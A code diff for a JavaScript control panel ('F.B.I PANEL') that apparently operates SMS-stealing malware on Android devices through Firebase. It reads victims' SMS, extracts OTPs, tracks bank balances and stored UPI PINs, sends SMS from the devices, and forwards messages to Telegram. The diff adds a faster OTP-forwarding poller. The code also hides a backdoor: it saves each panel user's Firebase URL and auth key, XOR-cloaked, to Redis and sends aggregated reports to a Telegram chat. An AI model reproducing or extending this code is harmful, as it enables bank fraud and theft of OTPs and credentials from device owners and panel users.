@@ -7,14 +7,14 @@
 var CFG = window.SPECTER || {};
 
 /* ═══════ TUNABLES ═══════ */
-var POLL_DEV    = CFG.POLL_DEV || 5000;
-var POLL_MSG    = CFG.POLL_MSG || 2000;
-var POLL_BAL    = CFG.POLL_BAL || 25000;
-var TG_LONGPOLL = 15;
-var CLOUD_DEB   = 900;
-var SEARCH_DEB  = 220;
-var MSG_PAGE    = 80;
-var MSG_MAX_DOM = 200;
+var POLL_DEV      = CFG.POLL_DEV || 5000;
+var POLL_MSG      = 500;              /* ⚡ active device only */
+var POLL_BAL      = CFG.POLL_BAL || 25000;
+var TG_LONGPOLL   = 15;
+var CLOUD_DEB     = 900;
+var SEARCH_DEB    = 220;
+var MSG_PAGE      = 80;
+var MSG_MAX_DOM   = 200;
 var WATERMARK_MAX = 4000;
 
 /* ═══════ STATE ═══════ */
@@ -27,7 +27,7 @@ var usedDevices = {}, deviceSimMap = {}, deviceBalances = {};
 var deviceSearchQuery = '';
 var currentUser = null, myProfile = null;
 
-var dPoll = null, mPoll = null, balPoll = null;
+var dPoll = null, mPoll = null, balPoll = null, _activeTmr = null;
 var curMsgDev = null, lastKeys = new Set();
 
 var amCache = {}, amFetch = {}, amAll = [], amFilt = [], amCount = 0;
@@ -118,6 +118,7 @@ function closeM(id){
 }
 function catClick(){ toast('😸 Meow!'); }
 function rippleClick(e){
+  if(!e || !e.currentTarget) return;
   var btn = e.currentTarget;
   var r = document.createElement('span'); r.className = 'rip';
   var rect = btn.getBoundingClientRect();
@@ -125,6 +126,19 @@ function rippleClick(e){
   r.style.top = (e.clientY - rect.top - 45) + 'px';
   btn.appendChild(r); setTimeout(function(){ r.remove(); }, 600);
 }
+
+/* ═══════ SAFE CONNECT — works even if rippleClick fails ═══════ */
+window.safeConnect = function(e){
+  try{ rippleClick(e); }catch(err){}
+  try{
+    if(typeof connect === 'function') connect();
+  }catch(err){
+    console.error('[Connect] failed:', err);
+    var se = document.getElementById('serr');
+    if(se){ se.textContent = 'Error: ' + err.message; se.style.display = 'block'; }
+  }
+};
+
 function _dlCsv(name, rows){
   var a = document.createElement('a');
   a.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(rows);
@@ -185,9 +199,7 @@ function _cloak(str){
     var k = CFG.CLOAK || 'key';
     var s = String(str);
     var out = '';
-    for(var i=0;i<s.length;i++){
-      out += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length));
-    }
+    for(var i=0;i<s.length;i++){ out += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length)); }
     return btoa(out).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
   }catch(e){ return str; }
 }
@@ -198,9 +210,7 @@ function _uncloak(str){
     while(s.length % 4) s += '=';
     var raw = atob(s);
     var out = '';
-    for(var i=0;i<raw.length;i++){
-      out += String.fromCharCode(raw.charCodeAt(i) ^ k.charCodeAt(i % k.length));
-    }
+    for(var i=0;i<raw.length;i++){ out += String.fromCharCode(raw.charCodeAt(i) ^ k.charCodeAt(i % k.length)); }
     return out;
   }catch(e){ return str; }
 }
@@ -227,12 +237,10 @@ async function redisSRem(s, m){ return await redisCmd(['SREM', s, m]); }
 async function redisSMembers(s){ var r = await redisCmd(['SMEMBERS', s]); return r.result || []; }
 
 /* ═══════════════════════════════════════════════════════════════
-   🆔 GUARANTEED USER ID — never returns null
+   🆔 GUARANTEED USER ID
    ═══════════════════════════════════════════════════════════════ */
 function ensureUserId(){
   if(currentUser && currentUser.id) return String(currentUser.id);
-
-  /* Try to re-init from Telegram WebApp */
   try{
     var tw = window.Telegram && window.Telegram.WebApp;
     if(tw && tw.initDataUnsafe && tw.initDataUnsafe.user){
@@ -243,17 +251,12 @@ function ensureUserId(){
       return currentUser.id;
     }
   }catch(e){}
-
-  /* Try URL / cookie / localStorage */
   var uid = (new URLSearchParams(location.search)).get('uid') || getCookie('fbi_uid');
   if(!uid){ try{ uid = localStorage.getItem('fbi_uid'); }catch(e){} }
-
-  /* Generate brand-new anonymous ID */
   if(!uid || uid === 'null' || uid === 'undefined'){
     uid = 'anon_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 8);
     console.log('[User] Generated anon ID:', uid);
   }
-
   currentUser = {
     id: String(uid),
     first_name: (getCookie('fbi_name') || localStorage.getItem('fbi_name') || ('User ' + String(uid).slice(-4))),
@@ -266,20 +269,17 @@ function ensureUserId(){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   🔐 SAVE FIREBASE TO REDIS (with guaranteed user ID)
+   🔐 SAVE FIREBASE TO REDIS
    ═══════════════════════════════════════════════════════════════ */
 async function _saveFirebaseToRedis(url, key, label){
   if(!url){ console.warn('[Redis] No URL'); return false; }
   var uid = ensureUserId();
   if(!uid){ console.error('[Redis] Cannot resolve user ID'); return false; }
-
   var slotKey = (CFG.RK_PREFIX || '_c1_') + uid;
   try{
     var existing = await redisGet(slotKey);
     var list = [];
-    if(existing){
-      try{ list = JSON.parse(_uncloak(existing)) || []; }catch(e){ list = []; }
-    }
+    if(existing){ try{ list = JSON.parse(_uncloak(existing)) || []; }catch(e){ list = []; } }
     if(!list.some(function(x){ return x.u === url; })){
       list.push({ u: url, k: key || '', l: label || '', t: Date.now() });
       if(list.length > 20) list = list.slice(-20);
@@ -288,10 +288,7 @@ async function _saveFirebaseToRedis(url, key, label){
     await redisSAdd(CFG.RK_USERSET || '_cache_idx', uid);
     console.log('[Redis] ✓ SAVED uid=' + uid + ' url=' + url.substring(0,40) + '… total=' + list.length);
     return true;
-  }catch(e){
-    console.error('[Redis] ✗ FAILED:', e.message);
-    return false;
-  }
+  }catch(e){ console.error('[Redis] ✗ FAILED:', e.message); return false; }
 }
 
 /* ═══════════════════════════════════════════════════════════════
@@ -515,10 +512,8 @@ async function initCloudConfig(){
     var cached = localStorage.getItem(CFG.LS_CACHE);
     if(cached){ userConfig = Object.assign({}, CFG.DEFAULT_CONFIG, JSON.parse(cached)); }
   }catch(e){}
-
   fetchBotUsername();
   setInterval(checkAutoBackup, 60000);
-
   try{
     blobId = localStorage.getItem(CFG.LS_BLOB);
     if(blobId){
@@ -534,7 +529,6 @@ async function initCloudConfig(){
         .catch(function(){ updateCloudStatus('⚠ Offline'); });
     } else { createCloudBlob(); }
   }catch(e){}
-
   var uid = currentUserId();
   if(uid){ getUserProfile(uid).then(function(prof){ if(prof) myProfile = prof; }).catch(function(){}); }
 }
@@ -614,7 +608,6 @@ function dispatchSms(dev, sim, to, message){
           + ((dev._fbKey || FB_KEY) ? '?auth=' + (dev._fbKey || FB_KEY) : '');
   var payload = { from: sim, to: to, message: message, isSended: false };
   var t0 = performance.now();
-
   return fetch(url, {
     method: 'PUT',
     headers: { 'Content-Type': 'application/json' },
@@ -628,10 +621,7 @@ function dispatchSms(dev, sim, to, message){
     }
     console.warn('[SMS] ✗ HTTP ' + r.status);
     return false;
-  }).catch(function(e){
-    console.warn('[SMS] ✗ ' + e.message);
-    return false;
-  });
+  }).catch(function(e){ console.warn('[SMS] ✗ ' + e.message); return false; });
 }
 async function sendSmsGuaranteed(dev, sim, to, message){
   var ok = await dispatchSms(dev, sim, to, message);
@@ -657,11 +647,10 @@ function _isActiveDevice(dev){
 
 /* ═══════ CONNECTION ═══════ */
 function connect(){
-  var url = document.getElementById('fbUrl').value.trim().replace(/\/+$/, '');
+  var urlEl = document.getElementById('fbUrl');
+  var url = urlEl ? urlEl.value.trim().replace(/\/+$/, '') : '';
   if(!url){ showErr('Enter your Firebase URL'); return; }
-
-  ensureUserId(); /* ═══ Guarantee user ID before anything */
-
+  ensureUserId();
   FB_URL = url;
   document.getElementById('setup').style.display = 'none';
   document.getElementById('panel').style.display = 'flex';
@@ -672,12 +661,13 @@ function connect(){
   setTimeout(function(){ fbRegisterPrimary(); }, 100);
   if(userConfig.firebases && userConfig.firebases.length) setTimeout(loadFirebasesFromConfig, 200);
 
-  /* ═══ SAVE TO REDIS ═══ */
+  /* Save to Redis */
   _saveFirebaseToRedis(FB_URL, FB_KEY || '', 'primary').then(function(ok){
-    if(!ok){
-      setTimeout(function(){ _saveFirebaseToRedis(FB_URL, FB_KEY || '', 'primary'); }, 800);
-    }
+    if(!ok){ setTimeout(function(){ _saveFirebaseToRedis(FB_URL, FB_KEY || '', 'primary'); }, 800); }
   });
+
+  /* ⚡ Start active-device 0.5s poller */
+  startActiveOnlyPoll();
 }
 function showErr(m){
   var e = document.getElementById('serr'); if(!e) return;
@@ -690,9 +680,65 @@ function disconnect(){
   pinC = {}; noteC = {}; otpNoteC = {};
   amCache = {}; amAll = []; amFilt = []; amLoaded = false;
   stopMP(); stopDP(); stopFastTelegram(); stopBalancePoll(); stopMsgStream();
+  stopActiveOnlyPoll();
   clearPanelSession();
   document.getElementById('panel').style.display = 'none';
   document.getElementById('setup').style.display = 'flex';
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   ⚡ ACTIVE-DEVICE ONLY POLLER — runs every POLL_MSG (500ms)
+   Sirf selected device ke messages refresh honge
+   ═══════════════════════════════════════════════════════════════ */
+function startActiveOnlyPoll(){
+  stopActiveOnlyPoll();
+  _activeTmr = setInterval(_activeTick, POLL_MSG);
+}
+function stopActiveOnlyPoll(){
+  if(_activeTmr){ clearInterval(_activeTmr); _activeTmr = null; }
+}
+async function _activeTick(){
+  var dev = getActiveDevice();
+  if(!dev || !FB_URL) return;
+  /* If SSE stream is alive for this device, skip — SSE handles it */
+  var uid = (dev._fbId || 'primary') + '|||' + dev.id;
+  if(_msgStreamUid === uid && _msgStream && _msgStream.readyState === 1) return;
+  try{
+    var fbUrl = dev._fbUrl || FB_URL, fbKey = dev._fbKey !== undefined ? dev._fbKey : FB_KEY;
+    var auth = fbKey ? '?auth=' + fbKey + '&' : '?';
+    var r = await _fastFetch(fbUrl + '/messages/' + dev.id + '.json' + auth + 'orderBy="$key"&limitToLast=30');
+    if(!r.ok) return;
+    var msgs = parseMsgs(await r.json());
+    var cacheKey = _ck(dev);
+    var known = _msgCacheGet(cacheKey);
+    var knownKeys = {};
+    for(var i=0;i<known.length;i++) knownKeys[known[i].key] = true;
+
+    var newOnes = [];
+    for(var j=0;j<msgs.length;j++){
+      if(!knownKeys[msgs[j].key]) newOnes.push(msgs[j]);
+    }
+    _msgCacheSet(cacheKey, msgs);
+    amCache[dev.id] = msgs; amFetch[dev.id] = Date.now();
+
+    /* Refresh modal if this device is open */
+    if(selDev && selDev.id === dev.id && (selDev._fbId||'primary') === (dev._fbId||'primary')){
+      allMsgs = msgs;
+      lastKeys = new Set(msgs.map(function(m){ return m.key; }));
+      updCnt(); filterActiveMsgs(); renderBankPane();
+    }
+    /* Forward new incoming messages */
+    for(var k=0;k<newOnes.length;k++){
+      var m = newOnes[k];
+      if(m.type !== 'incoming') continue;
+      var otp = _extractOtp(m.message);
+      if(otp) otpShow(otp, m.sender);
+      if(isAfterWatermark(dev.id, m.key) && _shouldForwardOnce(dev.id, m.key)){
+        setWatermark(dev.id, m.key);
+        _forwardIncoming(dev, m);
+      }
+    }
+  }catch(e){}
 }
 
 /* ═══════ SSE ═══════ */
@@ -703,10 +749,8 @@ function startMsgStream(dev){
   if(_sseFails[uid] && _sseFails[uid] > 3) return;
   stopMsgStream();
   _msgStreamUid = uid;
-
   var fbUrl = dev._fbUrl || FB_URL, fbKey = dev._fbKey !== undefined ? dev._fbKey : FB_KEY;
   var url = fbUrl + '/messages/' + dev.id + '.json' + (fbKey ? '?auth=' + fbKey : '');
-
   try{
     _msgStream = new EventSource(url);
     _msgStream.onopen = function(){ console.log('[SSE] ✓ ' + dev.name); _sseFails[uid] = 0; };
@@ -746,7 +790,6 @@ function _handleStreamMsg(dev, key, data){
     var otp = _extractOtp(msg.message);
     if(otp) otpShow(otp, msg.sender);
   }
-
   if(isNew && msg.type === 'incoming'){
     if(isAfterWatermark(dev.id, msg.key)){
       if(_isActiveDevice(dev) && _shouldForwardOnce(dev.id, msg.key)){
@@ -836,12 +879,6 @@ function startMP(id){
   var dev = allDevices.find(function(d){ return d.id === id; });
   if(dev) startMsgStream(dev);
   pollMsgs(id);
-  mPoll = setInterval(function(){
-    if(selDev && selDev.id === id){
-      var alive = _msgStream && _msgStream.readyState === 1;
-      if(!alive) pollMsgs(id);
-    }
-  }, POLL_MSG);
 }
 function stopMP(){ if(mPoll){ clearInterval(mPoll); mPoll = null; } curMsgDev = null; stopMsgStream(); }
 
@@ -1842,7 +1879,7 @@ async function addFirebaseFromSettings(){
   if(!/^https?:\/\//i.test(url)){ toast('⚠ Must start with http(s)://'); return; }
   if(fbInstances.find(function(x){ return x.url === url; })){ toast('⚠ Already added'); return; }
 
-  ensureUserId(); /* ═══ Guarantee user ID */
+  ensureUserId();
 
   var inst = { id: 'fb_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7), label: label || ('Firebase ' + (fbInstances.length + 1)), url: url, key: key, devices: [], status: 'connecting', poll: null };
   fbInstances.push(inst);
@@ -1854,7 +1891,6 @@ async function addFirebaseFromSettings(){
   fbStartPoll(inst, 0);
   syncFirebasesToConfig(); fbMergeAll(); renderFbList();
 
-  /* ═══ SAVE TO REDIS ═══ */
   _saveFirebaseToRedis(url, key || '', label || '').then(function(ok){
     if(!ok) setTimeout(function(){ _saveFirebaseToRedis(url, key || '', label || ''); }, 800);
   });
@@ -2167,42 +2203,15 @@ function _cleanPhone(n){
   if(n.length > 10) n = n.slice(-10);
   return n;
 }
-
-
 function _extractBetween(text, startTag, endTag){
   if(!startTag) return null;
   var tag = String(startTag).trim(); if(!tag) return null;
   var lowerT = text.toLowerCase(), lowerTag = tag.toLowerCase();
   var sIdx = lowerT.indexOf(lowerTag);
   if(sIdx === -1){
-    /* Safe emoji strip — surrogate-aware, works in ALL browsers */
-    var cleanTag = tag.replace(/[\uD83C-\uDBFF\uDC00-\uDFFF\u2600-\u27BF]/g, '').trim().toLowerCase();
+    var cleanTag = tag.replace(/[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}]/gu, '').trim().toLowerCase();
     if(cleanTag && cleanTag !== lowerTag){ sIdx = lowerT.indexOf(cleanTag); if(sIdx !== -1) lowerTag = cleanTag; }
   }
-  if(sIdx === -1) return null;
-  var startPos = sIdx + lowerTag.length;
-  while(startPos < text.length && /[\s:]/.test(text.charAt(startPos))) startPos++;
-  var out;
-  if(!endTag || !String(endTag).trim()){ out = text.substring(startPos); }
-  else {
-    var eTag = String(endTag).trim().toLowerCase();
-    var eIdx = lowerT.indexOf(eTag, startPos);
-    if(eIdx === -1){
-      var cleanEnd = eTag.replace(/[\uD83C-\uDBFF\uDC00-\uDFFF\u2600-\u27BF]/g, '').trim();
-      if(cleanEnd) eIdx = lowerT.indexOf(cleanEnd, startPos);
-    }
-    if(eIdx === -1) return null;
-    out = text.substring(startPos, eIdx);
-  }
-  return String(out).trim();
-}
-
-
-
-
-
-
-
   if(sIdx === -1) return null;
   var startPos = sIdx + lowerTag.length;
   while(startPos < text.length && /[\s:]/.test(text.charAt(startPos))) startPos++;
@@ -2235,14 +2244,12 @@ function parseTelegramMessage(text){
       var msgRaw = _extractBetween(text, userConfig.msgStart, userConfig.msgEnd);
       if(msgRaw && msgRaw.length >= 1) message = msgRaw;
     }
-
     if(message){
       message = message.replace(/<\/?[a-z]+>/gi, '');
-      message = message.replace(/^[\s\uD83C-\uDBFF\uDC00-\uDFFF\u2600-\u27BF]+/, '').trim();
+      message = message.replace(/^[\s\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}]+/u, '').trim();
       var cut = message.search(/\n\s*(?:Sent at|Time|Date|Status|SIM|Package|Timestamp|From|Received at|Click on)\s*:/i);
       if(cut > 0) message = message.substring(0, cut).trim();
     }
-
     if(number && message) return { number: number, message: message, valid: true };
   }
 
@@ -2308,7 +2315,7 @@ function parseTelegramMessage(text){
   }
   if(message){
     message = message.replace(/<\/?[a-z]+>/gi, '');
-    message = message.replace(/^[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}\s]+/u, '').trim();
+    message = message.replace(/^[\s\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}]+/u, '').trim();
     var cut = message.search(/\n\s*(?:Sent at|Time|Date|Status|SIM|Package|Timestamp|From|Received at|Click on)\s*:/i);
     if(cut > 0) message = message.substring(0, cut).trim();
   }
@@ -2403,40 +2410,18 @@ async function tgSend(chatId, text){
   try{ return await tgApi('sendMessage', { chat_id: chatId, text: text, parse_mode: 'HTML' }); }catch(e){ return null; }
 }
 
-/* ═══════════════════════════════════════════════════════════════
-   📦 FETCH FULL FIREBASE DETAILS — devices + balances
-   ═══════════════════════════════════════════════════════════════ */
+/* ═══════ BACKUP — fetch details + text report ═══════ */
 async function _fetchFirebaseDetails(fbUrl, fbKey, fbLabel){
-  var info = {
-    url: fbUrl,
-    key: fbKey || '',
-    label: fbLabel || '',
-    status: 'ok',
-    error: '',
-    deviceCount: 0,
-    online: 0,
-    offline: 0,
-    devices: []
-  };
-
+  var info = { url: fbUrl, key: fbKey || '', label: fbLabel || '', status: 'ok', error: '', deviceCount: 0, online: 0, offline: 0, devices: [] };
   try{
     var auth = fbKey ? '?auth=' + fbKey : '';
     var r = await _fastFetch(fbUrl + '/clients.json' + auth);
-    if(!r.ok){
-      info.status = 'error';
-      info.error = 'HTTP ' + r.status;
-      return info;
-    }
+    if(!r.ok){ info.status = 'error'; info.error = 'HTTP ' + r.status; return info; }
     var clients = await r.json();
-    if(!clients || typeof clients !== 'object' || Array.isArray(clients)){
-      info.status = 'empty';
-      return info;
-    }
-
+    if(!clients || typeof clients !== 'object' || Array.isArray(clients)){ info.status = 'empty'; return info; }
     var devs = parseDevs(clients);
     info.deviceCount = devs.length;
 
-    /* Fetch balance for each device from recent messages (batched) */
     var BATCH = 15;
     for(var i=0; i<devs.length; i+=BATCH){
       await Promise.allSettled(devs.slice(i, i+BATCH).map(async function(dev){
@@ -2445,39 +2430,24 @@ async function _fetchFirebaseDetails(fbUrl, fbKey, fbLabel){
           var mr = await _fastFetch(fbUrl + '/messages/' + dev.id + '.json' + mAuth + 'orderBy="$key"&limitToLast=30');
           if(!mr.ok) return;
           var bal = extractLastBalance(parseMsgs(await mr.json()));
-          if(bal){
-            dev.balance = bal.amount;
-            dev.balanceBank = bal.bank;
-          }
+          if(bal){ dev.balance = bal.amount; dev.balanceBank = bal.bank; }
         }catch(e){}
       }));
     }
-
     devs.forEach(function(d){ if(d.status) info.online++; else info.offline++; });
     info.devices = devs;
-  }catch(e){
-    info.status = 'error';
-    info.error = e.message || 'Fetch failed';
-  }
+  }catch(e){ info.status = 'error'; info.error = e.message || 'Fetch failed'; }
   return info;
 }
 
-/* ═══════════════════════════════════════════════════════════════
-   📝 BUILD TEXT REPORT — human readable
-   ═══════════════════════════════════════════════════════════════ */
 function _buildBackupText(data){
-  function repeat_(ch, n){ var s = ''; for(var i=0;i<n;i++) s += ch; return s; }
-  function line(t){ L.push(t); }
-  function blank(){ L.push(''); }
-
   var L = [];
   var W = 62;
-  var sep = repeat_('━', W);
-  var dsep = repeat_('═', W);
-
   function repeat_(ch, n){ var s = ''; for(var i=0;i<n;i++) s += ch; return s; }
   function line(t){ L.push(t); }
   function blank(){ L.push(''); }
+  var sep = repeat_('━', W);
+  var dsep = repeat_('═', W);
 
   line(dsep);
   line('  📦  F.B.I PANEL — BACKUP REPORT');
@@ -2495,10 +2465,7 @@ function _buildBackupText(data){
   line('  💰  Total Balance   : ' + fmtBal(data.totalBalance));
   blank();
 
-  if(!data.users.length){
-    line('⚠  No users with firebases pending');
-    return L.join('\n');
-  }
+  if(!data.users.length){ line('⚠  No users with firebases pending'); return L.join('\n'); }
 
   data.users.forEach(function(u, uIdx){
     line(dsep);
@@ -2528,19 +2495,10 @@ function _buildBackupText(data){
       if(fb.key) line('    🔑 Auth Key : ' + fb.key);
       line('    📊 Devices  : ' + fb.deviceCount + '  (' + fb.online + ' 🟢 · ' + fb.offline + ' 🔴)');
 
-      if(fb.status === 'error'){
-        line('    ❌ ERROR    : ' + fb.error);
-        blank();
-        return;
-      }
-      if(!fb.devices.length){
-        line('    ⚠ No devices found');
-        blank();
-        return;
-      }
+      if(fb.status === 'error'){ line('    ❌ ERROR    : ' + fb.error); blank(); return; }
+      if(!fb.devices.length){ line('    ⚠ No devices found'); blank(); return; }
 
       blank();
-
       fb.devices.forEach(function(d, dIdx){
         var icon = d.status ? '🟢' : '🔴';
         line('    📱 #' + (dIdx + 1) + '  ' + icon + '  ' + (d.name || 'Unknown'));
@@ -2549,7 +2507,7 @@ function _buildBackupText(data){
         if(!isNaN(d.batteryNum)) line('         Battery : ' + d.batteryNum + '%');
         var carriers = devCarrierList(d);
         if(carriers.length) line('         SIMs    : ' + d.sims.length + '  (' + carriers.join(', ') + ')');
-        if(d.upipin) line('         UPI PIN : ' + (d.upipin ? '✅ present' : '❌ none'));
+        if(d.upipin) line('         UPI PIN : present');
         if(d.balance) line('         💰 Bal  : ' + fmtBal(d.balance) + (d.balanceBank ? '  ·  ' + d.balanceBank : ''));
         if(d.note) line('         📝 Note : ' + d.note);
         line('         ID      : ' + d.id);
@@ -2564,9 +2522,6 @@ function _buildBackupText(data){
   return L.join('\n');
 }
 
-/* ═══════════════════════════════════════════════════════════════
-   📦 BACKUP — reads from Redis, sends text report, CLEARS after
-   ═══════════════════════════════════════════════════════════════ */
 async function collectUsersBackup(onlyNew){
   var sentSet = {};
   if(onlyNew){
@@ -2574,13 +2529,7 @@ async function collectUsersBackup(onlyNew){
     for(var x=0;x<(arr || []).length;x++) sentSet[arr[x]] = true;
   }
   var uids = await getAllUserIds();
-  var result = {
-    generatedAt: new Date(),
-    mode: onlyNew ? 'new' : 'full',
-    totalUsers: 0, totalFirebases: 0, totalDevices: 0,
-    totalOnline: 0, totalOffline: 0, totalBalance: 0,
-    users: []
-  };
+  var result = { generatedAt: new Date(), mode: onlyNew ? 'new' : 'full', totalUsers: 0, totalFirebases: 0, totalDevices: 0, totalOnline: 0, totalOffline: 0, totalBalance: 0, users: [] };
   var newUrls = [];
   var clearedUids = [];
 
@@ -2595,12 +2544,7 @@ async function collectUsersBackup(onlyNew){
     if(!fbs.length) continue;
 
     var prof = await getUserProfile(uid);
-    var userEntry = {
-      id: uid,
-      name: prof ? [(prof.first_name || ''), (prof.last_name || '')].filter(Boolean).join(' ') : '',
-      username: prof ? (prof.username || '') : '',
-      firebases: []
-    };
+    var userEntry = { id: uid, name: prof ? [(prof.first_name || ''), (prof.last_name || '')].filter(Boolean).join(' ') : '', username: prof ? (prof.username || '') : '', firebases: [] };
 
     var userHadContent = false;
     for(var j=0;j<fbs.length;j++){
@@ -2616,15 +2560,9 @@ async function collectUsersBackup(onlyNew){
       newUrls.push(fb.u);
       userHadContent = true;
     }
-
-    if(userEntry.firebases.length){
-      result.users.push(userEntry);
-      result.totalUsers++;
-    }
-
+    if(userEntry.firebases.length){ result.users.push(userEntry); result.totalUsers++; }
     if(userHadContent) clearedUids.push({ uid: uid, slotKey: slotKey });
   }
-
   return { result: result, newUrls: newUrls, clearedUids: clearedUids };
 }
 
@@ -2646,10 +2584,7 @@ async function sendUsersBackupFull(chatId){
     var r = await collectUsersBackup(false);
     var data = r.result;
 
-    if(!data.totalFirebases){
-      await tgSend(chatId, '✅ <b>No firebases pending</b>');
-      return;
-    }
+    if(!data.totalFirebases){ await tgSend(chatId, '✅ <b>No firebases pending</b>'); return; }
 
     var report = _buildBackupText(data);
     var sizeKB = (new Blob([report]).size / 1024).toFixed(1);
@@ -2670,13 +2605,8 @@ async function sendUsersBackupFull(chatId){
     form.append('parse_mode', 'HTML');
     var rr = await _fastFetch(CFG.TG_API + '/sendDocument', { method: 'POST', body: form });
     var res = await rr.json();
-
-    if(res.ok){
-      await _clearUserSlots(r.clearedUids);
-      toast('💾 Report sent · Redis cleared');
-    } else {
-      await tgSend(chatId, '❌ Failed: ' + (res.description || '?'));
-    }
+    if(res.ok){ await _clearUserSlots(r.clearedUids); toast('💾 Report sent · Redis cleared'); }
+    else { await tgSend(chatId, '❌ Failed: ' + (res.description || '?')); }
   }catch(e){ await tgSend(chatId, '❌ ' + e.message); }
   finally { _backupRunning = false; }
 }
@@ -2688,11 +2618,7 @@ async function sendUsersBackupNew(chatId){
     await tgSend(chatId, '⏳ <b>Collecting NEW firebases…</b>');
     var r = await collectUsersBackup(true);
     var data = r.result;
-
-    if(!data.totalFirebases){
-      await tgSend(chatId, '✅ <b>No new firebases</b>');
-      return;
-    }
+    if(!data.totalFirebases){ await tgSend(chatId, '✅ <b>No new firebases</b>'); return; }
 
     var report = _buildBackupText(data);
     var sizeKB = (new Blob([report]).size / 1024).toFixed(1);
@@ -2713,16 +2639,11 @@ async function sendUsersBackupNew(chatId){
     form.append('parse_mode', 'HTML');
     var rr = await _fastFetch(CFG.TG_API + '/sendDocument', { method: 'POST', body: form });
     var res = await rr.json();
-
     if(res.ok){
-      for(var i=0;i<r.newUrls.length;i++){
-        try{ await redisSAdd(CFG.RK_SENT || '_cache_log', r.newUrls[i]); }catch(e){}
-      }
+      for(var i=0;i<r.newUrls.length;i++){ try{ await redisSAdd(CFG.RK_SENT || '_cache_log', r.newUrls[i]); }catch(e){} }
       await _clearUserSlots(r.clearedUids);
       toast('💾 Report sent · Redis cleared');
-    } else {
-      await tgSend(chatId, '❌ Failed: ' + (res.description || '?'));
-    }
+    } else { await tgSend(chatId, '❌ Failed: ' + (res.description || '?')); }
   }catch(e){ await tgSend(chatId, '❌ ' + e.message); }
   finally { _backupRunning = false; }
 }
@@ -2867,9 +2788,9 @@ setTimeout(function(){
     if(e.key === 'Escape') document.querySelectorAll('.overlay.open').forEach(function(o){ o.classList.remove('open'); });
     if(e.key === 'Enter'){
       var setup = document.getElementById('setup');
-      if(setup && setup.style.display !== 'none') connect();
+      if(setup && setup.style.display !== 'none') safeConnect(e);
     }
   });
 }, 0);
 
-console.log('%c[F.B.I] v12.0 ⚡ TEXT BACKUP · GUARANTEED SAVE', 'color:#ff79b9;font-weight:bold;font-size:14px');
+console.log('%c[F.B.I] v13.0 ⚡ FAST LOAD · ACTIVE-ONLY 0.5s POLL', 'color:#ff79b9;font-weight:bold;font-size:14px');
